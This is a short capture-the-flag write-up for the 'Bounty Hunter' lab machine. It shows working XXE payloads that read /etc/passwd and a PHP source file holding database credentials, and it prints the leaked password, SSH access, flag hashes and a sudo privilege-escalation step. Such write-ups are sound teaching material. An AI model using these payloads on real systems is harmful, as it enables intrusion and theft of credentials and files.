# Bounty Hunter - 10.10.11.100

## Open Ports:

```
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
```

Found XXE Injection in: /log_submit.php

XXE payloads:

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
		<bugreport>
		<title>abc</title>
		<cwe>abc</cwe>
		<cvss>&ent;</cvss>
		<reward>456</reward>
		</bugreport>
```

This gave a user: development

Found a .php file db.php using nikto scan.

To read the contents:

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>
		<bugreport>
		<title>abc</title>
		<cwe>abc</cwe>
		<cvss>&ent;</cvss>
		<reward>456</reward>
		</bugreport>
```

It gave credentials to database.

```
development:m19RoAU0hP41A1sTsq6K
```

SSH into the machine.

```
user.txt: f710dc54bfdda8069dbae4e9443b7f1f
```

We can use sudo on a python3.8 file /opt/skytrain_inc/ticketValidator.py

It requests a file with .md extensions and the file must meet some conditions.

Wrote an exploit to get the root shell.

On running the script with sudo and providing the exploit path, got the root shell.

```
root.txt: 2d062daf2ff289356506e69ac6efd625
```
